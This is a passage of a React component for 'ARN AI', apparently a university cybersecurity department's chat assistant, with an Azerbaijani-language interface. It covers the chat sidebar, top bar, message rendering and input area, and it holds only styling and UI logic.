          <button onClick={createNewChat} style={{ width: '100%', padding: '10px 14px', borderRadius: 9, background: 'linear-gradient(135deg, rgba(99,102,241,0.15), rgba(139,92,246,0.1))', border: '1px solid rgba(99,102,241,0.4)', color: 'white', cursor: 'pointer', fontSize: 9, letterSpacing: 3, fontWeight: 700, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8, boxShadow: '0 0 16px rgba(99,102,241,0.15)' }}>
            <span style={{ fontSize: 12 }}>⚡</span><span>YENİ SÖHBƏT</span>
          </button>
        </div>
        <div style={{ flex: 1, overflowY: 'auto', padding: '8px 12px' }}>
          {chats.map(chat => (
            <div key={chat.id} onClick={() => { setCurrentChatId(chat.id); setSidebarOpen(false) }} style={{ padding: '10px 12px', borderRadius: 8, marginBottom: 4, cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'space-between', background: chat.id === currentChatId ? 'rgba(99,102,241,0.12)' : 'transparent', border: `1px solid ${chat.id === currentChatId ? 'rgba(99,102,241,0.3)' : 'transparent'}` }}>
              <div style={{ flex: 1, minWidth: 0, display: 'flex', alignItems: 'center', gap: 8 }}>
                <span style={{ color: 'rgba(129,140,248,0.5)', fontSize: 10, flexShrink: 0 }}>▸</span>
                <span style={{ fontSize: 10, letterSpacing: 1, color: chat.id === currentChatId ? '#a5b4fc' : 'rgba(148,163,184,0.6)', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{chat.title}</span>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* ══════════════════════════════════════════════════════════════════
          ƏSAS CHAT SAHƏSİ
      ══════════════════════════════════════════════════════════════════ */}
      <div style={{ flex: 1, display: 'flex', flexDirection: 'column', position: 'relative', zIndex: 2, height: '100%', width: '100%' }}>
        
        {/* Top Bar */}
        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '12px 20px', borderBottom: '1px solid rgba(99,102,241,0.1)', background: 'rgba(1,1,12,0.8)', backdropFilter: 'blur(20px)', position: 'relative', zIndex: 10 }}>
          <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: 1, background: 'linear-gradient(90deg, transparent, rgba(99,102,241,0.3), transparent)', animation: 'borderPulse 3s ease-in-out infinite' }} />
          <div style={{ display: 'flex', alignItems: 'center', gap: 14 }}>
            {/* Daxili menyunu açan düymə (əgər lazım deyilsə silə bilərsiniz) */}
            <button onClick={e => { e.stopPropagation(); setSidebarOpen(true) }} style={{ background: 'rgba(99,102,241,0.08)', border: '1px solid rgba(99,102,241,0.25)', color: '#818cf8', width: 36, height: 36, borderRadius: 9, cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><line x1="3" y1="6" x2="21" y2="6" /><line x1="3" y1="12" x2="15" y2="12" /><line x1="3" y1="18" x2="18" y2="18" /></svg>
            </button>
            <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
              <div style={{ width: 32, height: 32, borderRadius: 9, background: 'linear-gradient(135deg, #6366f1, #9333ea)', display: 'flex', alignItems: 'center', justifyContent: 'center', boxShadow: '0 0 18px rgba(99,102,241,0.45)', animation: 'logoPulse 2.5s ease-in-out infinite' }}>
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2.5" strokeLinecap="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2" /></svg>
              </div>
              <div>
                <div style={{ fontSize: 13, fontWeight: 700, letterSpacing: 3, background: 'linear-gradient(135deg, #818cf8, #c084fc)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>ARN AI</div>
              </div>
            </div>
          </div>
          <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
            <button onClick={e => { e.stopPropagation(); createNewChat() }} style={{ background: 'linear-gradient(135deg, rgba(99,102,241,0.15), rgba(139,92,246,0.1))', border: '1px solid rgba(99,102,241,0.35)', color: '#a5b4fc', height: 36, borderRadius: 9, cursor: 'pointer', display: 'flex', alignItems: 'center', gap: 6, padding: '0 14px', fontSize: 9, letterSpacing: 2, fontWeight: 700 }}>
              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round"><line x1="12" y1="5" x2="12" y2="19" /><line x1="5" y1="12" x2="19" y2="12" /></svg>
              <span>YENİ</span>
            </button>
          </div>
        </div>

        {/* Messages */}
        <div style={{ flex: 1, overflowY: 'auto', padding: '24px 20px', display: 'flex', flexDirection: 'column', gap: 16, position: 'relative' }}>
          {!currentChat?.messages.length && (
            <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', height: '100%', textAlign: 'center', gap: 14, animation: 'fadeUp 0.8s cubic-bezier(0.16,1,0.3,1) both' }}>
              <div style={{ width: 80, height: 80, borderRadius: 22, background: 'rgba(99,102,241,0.08)', border: '1px solid rgba(99,102,241,0.3)', display: 'flex', alignItems: 'center', justifyContent: 'center', animation: 'corePulse 2.5s ease-in-out infinite', position: 'relative' }}>
                <div style={{ position: 'absolute', inset: -8, borderRadius: '50%', border: '1px solid rgba(99,102,241,0.1)', animation: 'glowRing 3s ease-in-out infinite' }} />
                <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#818cf8" strokeWidth="2.5" strokeLinecap="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2" /></svg>
              </div>
              <div>
                <div style={{ fontSize: 8, letterSpacing: 4, color: 'rgba(129,140,248,0.45)', marginBottom: 8 }}>// neural.core.active</div>
                <div style={{ fontSize: 28, fontWeight: 700, background: 'linear-gradient(135deg, #818cf8, #c084fc)', backgroundSize: '200% 100%', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent', letterSpacing: 4, animation: 'shimmer 3s linear infinite' }}>ARN AI</div>
              </div>
              <p style={{ maxWidth: 380, lineHeight: 1.8, fontSize: 10, letterSpacing: 1, color: 'rgba(148,163,184,0.5)' }}>Penetration testing, etik hacking və kibertəhlükəsizlik haqqında suallarınızı soruşun.</p>
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8, marginTop: 12, width: '100%', maxWidth: 480 }}>
                {SUGGESTIONS.map(q => (
                  <button key={q} onClick={e => { e.stopPropagation(); setInput(q) }} style={{ padding: '12px 14px', borderRadius: 10, cursor: 'pointer', background: 'rgba(4,4,22,0.85)', border: '1px solid rgba(99,102,241,0.18)', color: 'rgba(148,163,184,0.55)', fontSize: 9, letterSpacing: 1, textAlign: 'left', lineHeight: 1.7, backdropFilter: 'blur(10px)' }}>
                    <span style={{ color: '#818cf8', marginRight: 6, opacity: 0.7 }}>▸</span>{q}
                  </button>
                ))}
              </div>
            </div>
          )}

          {currentChat?.messages.map((message, idx) => (
            <div key={message.id} className="msg-appear" style={{ animationDelay: `${Math.min(idx * 0.03, 0.3)}s`, display: 'flex', gap: 10, justifyContent: message.role === 'user' ? 'flex-end' : 'flex-start', alignItems: 'flex-start', maxWidth: '100%' }}>
              {message.role === 'assistant' && (
                <div style={{ width: 34, height: 34, borderRadius: 10, flexShrink: 0, marginTop: 2, background: 'rgba(99,102,241,0.1)', border: '1px solid rgba(99,102,241,0.35)', display: 'flex', alignItems: 'center', justifyContent: 'center', boxShadow: '0 0 14px rgba(99,102,241,0.2)' }}>
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#818cf8" strokeWidth="2.5" strokeLinecap="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2" /></svg>
                </div>
              )}
              <div style={{ maxWidth: message.role === 'user' ? '72%' : '82%', padding: message.role === 'user' ? '10px 16px' : '12px 16px', borderRadius: 14, position: 'relative', overflow: 'hidden', ...(message.role === 'user' ? { background: 'linear-gradient(135deg, rgba(99,102,241,0.18), rgba(139,92,246,0.12))', border: '1px solid rgba(99,102,241,0.3)', borderBottomRightRadius: 4, color: '#e2e8f0', fontSize: '0.88rem', lineHeight: 1.65, boxShadow: '0 0 20px rgba(99,102,241,0.08)' } : { background: 'rgba(4,4,22,0.88)', border: '1px solid rgba(99,102,241,0.15)', borderBottomLeftRadius: 4, backdropFilter: 'blur(20px)', boxShadow: '0 0 25px rgba(99,102,241,0.06)' }) }}>
                {message.role === 'assistant' ? (message.content ? <MarkdownMessage content={message.content} /> : <ThinkingDots />) : (message.content)}
              </div>
              {message.role === 'user' && (
                <div style={{ width: 34, height: 34, borderRadius: 10, flexShrink: 0, marginTop: 2, background: 'linear-gradient(135deg, #6366f1, #9333ea)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: 700, fontSize: 13, color: 'white', boxShadow: '0 0 14px rgba(99,102,241,0.35)', border: '1px solid rgba(255,255,255,0.15)' }}>U</div>
              )}
            </div>
          ))}
          <div ref={messagesEndRef} />
        </div>

        {/* Input Area */}
        <div style={{ padding: '12px 20px 18px', borderTop: '1px solid rgba(99,102,241,0.1)', background: 'rgba(1,1,12,0.9)', backdropFilter: 'blur(30px)', position: 'relative' }}>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 10, padding: '0 2px' }}>
            <span style={{ fontSize: 8, letterSpacing: 2, color: 'rgba(129,140,248,0.35)' }}>// messages: {tokenUsed}/{tokenLimit}</span>
          </div>
          <div style={{ display: 'flex', gap: 10, alignItems: 'flex-end', padding: '10px 14px', borderRadius: 14, background: 'rgba(4,4,22,0.9)', border: '1px solid rgba(99,102,241,0.22)', position: 'relative', overflow: 'hidden', boxShadow: '0 0 20px rgba(99,102,241,0.05)' }}>
            <textarea ref={textareaRef} value={input} onChange={e => setInput(e.target.value)} onKeyDown={handleKeyDown} onClick={e => e.stopPropagation()} placeholder="// sualınızı yazın...  (Enter → göndər)" style={{ flex: 1, background: 'transparent', border: 'none', outline: 'none', resize: 'none', color: '#e2e8f0', fontFamily: "'Space Mono', monospace", fontSize: '0.88rem', lineHeight: 1.6, minHeight: 22, maxHeight: 128 }} rows={1} />
            <button onClick={e => { e.stopPropagation(); handleSend() }} disabled={isLoading || !input.trim()} style={{ flexShrink: 0, width: 38, height: 38, borderRadius: 10, display: 'flex', alignItems: 'center', justifyContent: 'center', cursor: isLoading || !input.trim() ? 'not-allowed' : 'pointer', border: 'none', ...(isLoading || !input.trim() ? { background: 'rgba(99,102,241,0.06)', color: 'rgba(99,102,241,0.25)' } : { background: 'linear-gradient(135deg, #6366f1, #9333ea)', color: 'white', boxShadow: '0 0 22px rgba(99,102,241,0.4)' }) }}>
              {isLoading ? (<svg style={{ animation: 'spin 1s linear infinite', width: 15, height: 15 }} viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" strokeDasharray="31.4" strokeDashoffset="10" strokeLinecap="round" /></svg>) : (<svg width="15" height="15" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M13 10V3L4 14h7v7l9-11h-7z" /></svg>)}
            </button>
          </div>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 16, marginTop: 8, fontSize: 7, letterSpacing: 2, color: 'rgba(148,163,184,0.18)' }}>
            <span>AZTU</span><span style={{ color: 'rgba(99,102,241,0.2)' }}>·</span><span>CYBERSEC DEPT</span>
          </div>
        </div>

      </div>
    </div>
  )
}
